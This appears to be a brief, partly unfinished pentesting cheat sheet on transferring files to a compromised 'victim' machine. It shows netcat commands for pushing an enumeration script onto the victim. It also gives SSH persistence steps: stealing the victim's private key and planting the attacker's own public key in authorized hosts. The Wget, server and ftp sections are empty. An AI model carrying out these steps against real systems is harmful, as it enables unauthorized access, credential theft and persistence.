# Transfering files


### Netcat
The easiest way normally is to use netcat. 

So on the victim-machine we run nc like this:
```nc -lvp 3333 > enum.sh```

ANd on the attacking machine we send the file like this:

```nc 192.168.1.103 < enum.sh```

I have sometimes recieved this error:

`This is nc from the netcat-openbsd package. An alternative nc is available`

I have just run this command instead:
`nc -l 1234 > file.sh`

### SSH
If you manage to upload a reverse-shell and get access to the machine you might be able to enter using ssh. Which might give you a better shell and more stability, and all the other features of SSH. Like transferring files.

So, in the /home/user dir you can find the hidden `.ssh` files by typing `ls -la`.
Then you need to do two things.

1. Copy the private key.
2. Add your own key *public key* to authorized hosts. Of course, this is not very good for your opsec. 

Wget

server



ftp

